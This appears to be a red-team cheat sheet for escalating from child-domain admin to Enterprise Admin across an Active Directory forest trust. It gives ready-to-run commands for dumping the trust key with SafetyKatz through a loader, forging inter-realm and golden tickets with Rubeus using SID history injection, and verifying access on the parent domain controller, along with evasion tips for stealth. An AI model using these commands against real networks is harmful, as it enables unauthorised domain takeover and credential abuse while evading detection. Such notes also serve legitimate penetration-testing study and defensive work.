# Cross-Domain Trust Attack (Intra-Forest)

Abuse inter-domain trust within the same forest to escalate from child domain DA to parent domain EA using SID history injection.

## Extract Trust Key (from child DC)
Requires DA on child domain. Run from child DC via winrs/PSRemote:
```
Loader.exe -path SafetyKatz.exe -args "lsadump::evasive-trust /patch" "exit"
```
Captures: `rc4_hmac_nt` trust key for `<CHILD> -> <PARENT>` direction.

## Forge Inter-Realm TGT (Silver ticket for krbtgt)
```
Loader.exe -path Rubeus.exe -args evasive-silver /service:krbtgt/<CHILD_DOMAIN> /rc4:<trust_key_rc4> /sid:<child_domain_sid> /sids:<EA_SID>-519 /ldap /user:Administrator /nowrap
```
- `/sids:<EA_SID>-519` — injects Enterprise Admins SID into SID history
- Use AES256 trust key with `/aes256:` for better OPSEC

## Request TGS in Parent Domain
```
Loader.exe -path Rubeus.exe -args asktgs /service:http/<PARENT_DC> /dc:<PARENT_DC> /ptt /ticket:<base64_inter_realm_ticket>
```

## Verify EA Access
```
winrs -r:<PARENT_DC> cmd /c set username
```

## Alternative: krbtgt Golden Ticket with /sids
If you have child krbtgt hash:
```
Loader.exe -path Rubeus.exe -args evasive-golden /user:Administrator /sids:<EA_SID>-519 /aes256:<child_krbtgt_aes256> /domain:<CHILD_DOMAIN> /ptt
```
Directly grants EA via SID history — no trust key needed.
